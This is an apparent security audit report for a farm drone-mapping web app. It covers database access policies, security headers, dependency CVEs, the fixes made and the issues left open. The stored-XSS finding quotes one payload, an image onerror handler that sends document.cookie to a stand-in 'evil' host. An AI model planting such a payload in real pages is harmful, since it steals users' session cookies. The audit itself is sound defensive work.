# Security audit — 2026-08-20

Full pass across authentication, injection, API abuse, secrets, dependencies
and hardening. Attacks were **run against the live database**, not reasoned
about, and the results below are what came back.

**Tests: 682 passing before, 692 after, 10 added. Nothing broke.**

No claim is made that the app is now secure in general — no audit can say that.
This is what was checked, what was found, what was fixed, and what is still
open.

---

## The short version

The important thing to know: **the database held up under real attack.** A
logged-in stranger cannot read, change or delete another farmer's fields,
scans, drones, boundaries or spray schedules, and cannot forge a row in their
name. That was tested with actual queries against real rows, not assumed from
reading the policies.

What was found was a layer out from that: a way to attack *yourself* through a
map label, a missing set of browser protections, and some out-of-date build
tools. All three are fixed. Three smaller things are left open on purpose, each
explained below.

---

## Fixed

### 1. Stored XSS in map labels — Low (self-inflicted today)

**Where:** `layers.tsx` (annotation name, AI zone name, severity badge),
`GridAnomaliesLayer.tsx` (issue tag).

**The concrete problem:** Leaflet treats a plain string handed to a map
tooltip as HTML. So naming a hand-drawn polygon
`<img src=x onerror="fetch('//evil?'+document.cookie)">` and hovering it would
run that code.

**Why it is Low and not High:** the text lives in your own row, which RLS keeps
private, so the only browser it can reach is your own. The two places another
person's text is displayed are both already safe — the pilot-applications admin
screen renders through React (which escapes automatically) and the PDF exporter
draws glyphs, not markup.

**Fixed:** every free-text value now goes through a shared `safeLabel()`. Also
escaped the severity badge and a uuid that lands inside an HTML attribute.

**Why fix a self-only bug:** it costs almost nothing, and the moment a field is
shared with an agronomist or a contractor, "only the attacker sees it" stops
being true.

**Test:** five real payloads must render inert; four of those tests fail if the
escaping is removed (verified by deliberately breaking it).

### 2. No clickjacking protection, no CSP — Medium

**Where:** `vercel.json`. Only `Strict-Transport-Security` was set.

**The concrete problem:** another site could load SwathWise in an invisible
frame, float its own buttons on top, and harvest your clicks. In most apps that
means an unwanted follow. Here the buttons underneath include **Clear all
treatment grid zones** and boundary editing — a season of painted work.

**Fixed:** `X-Frame-Options: DENY` and `frame-ancestors 'none'` (belt and
braces, old browsers and new), plus `nosniff`, a referrer policy, and a
permissions policy switching off camera, microphone, payment and USB.

**Deliberately incomplete:** the full content policy — which origins may serve
scripts, images and fonts — ships in **Report-Only** mode. Enforcing it blind,
with no browser to test in, risks taking down the basemap, the fonts or the app
itself. It reports violations without blocking. **Next step: check the reports,
then promote it to enforced.**

### 3. Five high-severity dependency CVEs — High label, low real risk

**Fixed** by a non-breaking `npm audit fix`. Production went from 8
vulnerabilities (5 high, 3 moderate) to **2 moderate**.

Worth being straight about: none were exploitable here. `postcss`, `glob`,
`minimatch`, `brace-expansion` are build tools — they process our own CSS and
file paths at build time, never a stranger's input. `nanoid` does reach the
browser bundle, but nothing in this app calls it, and its bug needs a
caller-supplied negative size. They are fixed because keeping known CVEs around
is a bad habit, not because someone was about to walk through them.

### 4. Workspace route outside the auth guard — Low

`/app/orthomosaic/:taskId` was the only `/app` route not wrapped in
`RequireAuth`. It did check for a session, but answered with a dead-end "Please
sign in." instead of sending you to the login page. No data was ever exposed —
RLS does that work — so this is consistency and defence in depth.

---

## Verified and left alone

### The database

Every user table carries `FOR ALL USING (auth.uid() = user_id) WITH CHECK
(auth.uid() = user_id)` — one policy covering read, insert, update and delete.
Tested live, against real rows:

| Attack | Result |
| --- | --- |
| Anonymous visitor reads fields / scans / annotations / jobs / drones / profiles | **0 rows** each |
| Signed-in stranger reads the same tables | **0 rows** each |
| Signed-in stranger updates fields they do not own | **0 rows changed** |
| Signed-in stranger deletes annotations they do not own | **0 rows deleted** |
| Signed-in stranger inserts a row stamped with someone else's user id | **Rejected** by the policy |

The service role sees 2 fields, 7 annotations and 4 scans at the same moment,
so those zeros are RLS working, not empty tables.

`profiles` has no DELETE policy. With RLS on, that means deletes are refused by
default — it fails closed, which is the safe direction.

### Storage

All four buckets are private. Every policy requires the first folder of the
path to equal your own user id, which **structurally defeats path traversal** —
a crafted filename cannot escape into another user's folder, because the folder
name *is* the check.

### Imagery access

The tile functions verify ownership before serving a single pixel, and return
**404 rather than 403** — which correctly avoids confirming that someone else's
scan exists.

### Secrets

- `.env` is not tracked by git; `.gitignore` covers `.env` and `.env.*`.
- The key shipped to browsers is the **anon** key (decoded and confirmed:
  `role: anon`), which is exactly right — RLS is what protects the data.
- No service-role key anywhere in `src/` or in the built bundle.
- The OpenWeather key is held server-side in an edge function and never
  reaches the browser. That is the correct pattern.

### Client-side tampering

There is no server that recomputes mission stats, chemical volume or refill
counts, so there is no server-side value for a tampered client to spoof. A
modified client can only lie to the person running it, about their own rows.
The `jobs.stats` snapshot is client-written, but RLS means only the owner can
write it.

### Session storage

Sessions live in `localStorage` with auto-refresh. `httpOnly` cookies would be
stronger, but they are not available to a static single-page app without a
server rendering layer. Standard tradeoff for this architecture; noted rather
than pretended away.

---

## Open, with reasons

### A. Storage buckets have no size or file-type limits — Medium

Any signed-in user can upload arbitrarily large files, or any file type, into
their own folder. It cannot touch anyone else's data — the folder check holds —
so this is a **cost and abuse** problem, not a breach: someone could park
hundreds of gigabytes on your Supabase bill.

**Why it is not fixed:** real scans already reach **1.1 GB** and orthomosaics
339 MB. Picking a cap is picking a number that might break a customer's upload
mid-survey, and only you know how big your largest customer's flight is. The
SQL is ready — choose the numbers:

```sql
update storage.buckets set file_size_limit = 5368709120 where id = 'scans';   -- 5 GB
update storage.buckets set file_size_limit = 2147483648 where id = 'orthos';  -- 2 GB
update storage.buckets set file_size_limit =   52428800 where id = 'field-reports'; -- 50 MB
```

Those are roughly 4× current observed peaks. MIME allowlists are worth adding
too, but the scans bucket takes zipped image folders, so the list needs
checking against a real upload first.

### B. The weather function is unauthenticated and CORS-wildcarded — Medium

`supabase/functions/weather` requires no login and sends
`Access-Control-Allow-Origin: *`, so any website could call it in a loop. It
proxies a forecast and touches **no user data**, so nothing leaks — but it
burns your edge-function invocations and your OpenWeather quota.

**Why it is not fixed here:** requiring auth means redeploying a live edge
function, which is a separate deploy I would not do blind in the middle of an
audit. The change is small: reject requests without a valid token, and replace
the `*` with your own origin.

### C. `react-router` open-redirect CVE — Moderate

Fixing it requires a major version jump (6 → 7), which is a breaking change.
The bug lets a crafted backslash URL redirect a user off-site — but it needs a
navigation target the attacker controls, and this app never passes user input
to `navigate()` or `<Link>`; every route is a fixed string. Upgrade it on a
quiet day with the router's migration guide, not during a security pass.

### D. Leaked-password protection is off — Low

Supabase can check new passwords against HaveIBeenPwned. It is currently
disabled. One toggle in the Supabase dashboard, no code change.

### E. PostGIS boilerplate — Low, accepted

`spatial_ref_sys` is readable without logging in, and `postgis` sits in the
public schema. This table is the standard PostGIS list of map projections —
public reference data, identical in every PostGIS install, with nothing of
yours in it. Enabling RLS on it is known to break PostGIS functions. Accepted
rather than fixed.

---

## What was tested, and how to re-run it

`src/test/security.test.ts` — 10 tests:

- five XSS payloads must render inert, and ordinary names like
  `Smith & Sons` must survive unmangled;
- the attribute-breakout route (a bare quote) must be closed;
- the security headers must be present, the enforced policy must stay narrow
  enough not to break the map, and the report-only policy must keep every
  origin the app really needs;
- the SPA rewrite must survive.

The XSS tests were mutation-checked: with the escaping removed, four fail.

The database attacks in the table above were run live and are reproducible with
the queries in this document's history; they are not part of the automated
suite, because pointing tests at production data is its own bad idea.
